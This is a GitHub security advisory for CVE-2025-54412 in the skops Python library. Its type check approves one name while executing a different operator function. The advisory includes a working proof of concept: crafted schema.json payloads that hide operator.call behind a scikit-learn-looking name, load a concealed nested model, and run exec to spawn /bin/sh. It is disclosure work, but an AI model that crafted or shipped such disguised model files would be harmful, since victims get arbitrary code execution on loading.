# [H] Skops has Inconsistent Trusted Type Validation that Enables Hidden `operator` Methods Execution

## Summary
Severity: High
Advisory: GHSA-m7f4-hrc6-fwg3
CVE: CVE-2025-54412
CWE: CWE-351
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:P/PR:N/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-07-25
Source: https://github.com/advisories/GHSA-m7f4-hrc6-fwg3
Type: github-advisory

## Affected
- PyPI: `skops` — affected >=0 <0.12.0

## Details
## Summary
An inconsistency in `OperatorFuncNode` can be exploited to hide the execution of untrusted `operator.xxx` methods. This can then be used in a code reuse attack to invoke seemingly safe functions and escalate to arbitrary code execution with minimal and misleading trusted types.

**Note:** This report focuses on `operator.call` as it appears to be the most interesting target, but the same technique applies to other `operator` methods. Moreover, focusing on a specific example is not necessary, the `operator.call` invocation was a zero-effort choice meant solely to demonstrate the issue. The key point is the **inconsistency** that allows a user to approve a type as trusted, while in reality enabling the execution of `operator.xxx`.



## Details

The `OperatorFuncNode` allows calling methods belonging to the `operator` module and included in a trusted list of methods. However, what is returned by `get_untrusted_types` and checked during the `load` call is not exactly the same as what is actually called. Instead, it is something partially controlled by the model author. This means that the user checking the untrusted types can be tricked into thinking something benign is being used, while in reality the `operator.xxx` method is executed.

Let’s look at the implementation of the `OperatorFuncNode`:

```python
# from io/_general.py:618-633
class OperatorFuncNode(Node):
    def __init__(
        self,
        state: dict[str, Any],
        load_context: LoadContext,
        trusted: Optional[Sequence[str]] = None,
    ) -> None:
        super().__init__(state, load_context, trusted)
        self.trusted = self._get_trusted(trusted, [])
        self.children["attrs"] = get_tree(state["attrs"], load_context, trusted=trusted)

    def _construct(self):
        op = getattr(operator, self.class_name)
        attrs = self.children["attrs"].construct()
        return op(*attrs)
```

As you can see, what is called during construction is `operator.class_name`, where `class_name` is the value of the `"__class__"` key in the `schema.json` file of the `model.skops`. However, what is returned by `get_untrusted_types` and checked during `load` is the concatenation of the `__module__` and `__class__` keys. Interestingly, `__module__` is not used in the construction of the `OperatorFuncNode`, allowing an attacker to forge a module name that, when concatenated with the `__class__` name, seems harmless and related to the model being loaded, while actually calling the `operator.class_name` function.

For example, an attacker can create a `schema.json` file with the following content:

```json
{
  "__class__": "call",
  "__module__": "sklearn.linear_model._stochastic_gradient.SGDRegressor",
  "__loader__": "OperatorFuncNode",
  ...
}
```

What is returned by `get_untrusted_types` and checked during `load` is `"sklearn.linear_model._stochastic_gradient.SGDRegressor.call"`, which seems harmless and related to the model being loaded. However, what is actually called during the construction of the `OperatorFuncNode` is `operator.call`, which can be used to call arbitrary functions with the provided arguments.

**NOTE:** There is also the possibility of a collision with a real method ending with `.call`. If, at some point, the user needs to trust a type like `something.somewhere.call`, then the attacker can use the same name while actually executing `operator.call`. This also means that, if at any point `skops` adds a default trusted element named `call`, the attacker can use it to execute arbitrary code by invoking `operator.call` with the provided arguments.

## PoC

As an example, to create a model that seems perfectly harmless but allows fully arbitrary code execution, reuse code of the `skops.io.loads` function from the `skops` library. This function was chosen because, even though it is not in the default trusted list of `skops`, it appears perfectly harmless and appropriate in the context of loading a model with `skops`, hence it is likely to be trusted by users.

In particular, the `OperatorFuncNode` is combined with the `skops.io.loads` function to create a model (`model.skops`) that, when loaded, executes a second model load using another, hidden model zipped into the original `model.skops` file (hence not visible to the user unless manually unzipped and inspected). The second model is loaded with controlled arguments, allowing the attacker to specify any trusted list, thereby enabling arbitrary code execution.

### Zip file structure

The zip file `model.skops` has the following structure:

```
model.skops
├── schema.json
├── my-model-evil.skops
    └── schema.json
```

### Payload

The `schema.json` file of `model.skops` is as follows:

```json
{
  "__class__": "call",
  "__module__": "sklearn.linear_model._stochastic_gradient.SGDRegressor",
  "__loader__": "OperatorFuncNode",
  "attrs": {
    "__class__": "tuple",
    "__module__": "builtins",
    "__loader__": "TupleNode",
    "content": [
      {
        "__class__": "loads",
        "__module__": "skops.io",
        "__loader__": "TypeNode",
        "__id__": 5
      },
      {
        "__class__": "bytes",
        "__module__": "builtins",
        "__loader__": "BytesNode",
        "file": "my-model-evil.skops",
        "__id__": 6
      },
      {
        "__class__": "list",
        "__module__": "builtins",
        "__loader__": "ListNode",
        "content": [
          {
            "__class__": "str",
            "__module__": "builtins",
            "__loader__": "JsonNode",
            "content": "\"builtins.exec\""
          },
          {
            "__class__": "str",
            "__module__": "builtins",
            "__loader__": "JsonNode",
            "content": "\"sk.call\""
          }
        ]
      }
    ],
    "__id__": 8
  },
  "__id__": 10,
  "protocol": 2,
  "_skops_version": "0.11.0"
}
```

Inside the zip file `model.skops`, there is a file `my-model-evil.skops` with the following content:

```json
{
  "__class__": "call",
  "__module__": "sk",
  "__loader__": "OperatorFuncNode",
  "attrs": {
    "__class__": "tuple",
    "__module__": "builtins",
    "__loader__": "TupleNode",
    "content": [
      {
        "__class__": "exec",
        "__module__": "builtins",
        "__loader__": "TypeNode",
        "__id__": 1
      },
      {
        "__class__": "str",
        "__module__": "builtins",
        "__loader__": "JsonNode",
        "content": "\"import os; os.system('/bin/sh')\"",
        "__id__": 5,
        "is_json": true
      }
    ],
    "__id__": 8
  },
  "__id__": 10,
  "protocol": 2,
  "_skops_version": "0.11.0"
}
```

Since the first model loads it, the second model is loaded with the attacker-controlled trusted list `["builtins.exec", "sk.call"]`, allowing execution of the `exec` function with the provided argument without any further confirmation from the user. In this example, a shell command is executed, but the attacker can modify the payload to execute any arbitrary code.

### What is shown when executing the payload

Suppose a user loads the model with the following code:

```python
from skops.io import load, get_untrusted_types

unknown_types = get_untrusted_types(file="model.skops")
print("Unknown types", unknown_types)
input("Press enter to load the model...")
loaded = load("model.skops", trusted=unknown_types)
```

The output will be:

```
Unknown types ['sklearn.linear_model._stochastic_gradient.SGDRegressor.call', 'skops.io.loads']
Press enter to load the model...
```

This shows that the user is tricked into believing the model is safe, with apparently legitimate types like `sklearn.linear_model._stochastic_gradient.SGDRegressor.call` and `skops.io.loads`, while in reality, a shell is executed.

**This is just one example, but the same technique can be used to execute any arbitrary code with even more  misleading names.**

### Possible Fix

`get_untrusted_types` and `load` should verify what is actually called during the construction of the `OperatorFuncNode`, not just rely on the concatenation of the `__module__` and `__class__` keys, which do not reflect the true behavior in this case.

## Impact
An attacker can exploit this vulnerability by crafting a malicious model file that, when loaded, requests trusted types that are different from those actually executed by the model. Potentially, this can escalate— as shown— to the execution of arbitrary code on the victim’s machine, requiring only the confirmation of a few seemingly safe types. The attack occurs at load time. This is particularly concerning given that `skops` is often used in collaborative environments and promotes a security-oriented policy.



## Attachments
The complete PoC is available on GitHub at [io-no/CVE-2025-54412](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-54412).

## References
- https://github.com/skops-dev/skops/security/advisories/GHSA-m7f4-hrc6-fwg3
- https://nvd.nist.gov/vuln/detail/CVE-2025-54412
- https://github.com/skops-dev/skops/commit/0aeca055509dfb48c1506870aabdd9e247adf603
- https://drive.google.com/file/d/1c2KrjayE_S1siaou0vDmGK7_MQ7_YCUZ/view?usp=sharing
- https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-54412
- https://github.com/skops-dev/skops
- https://github.com/skops-dev/skops/releases/tag/v0.12.0
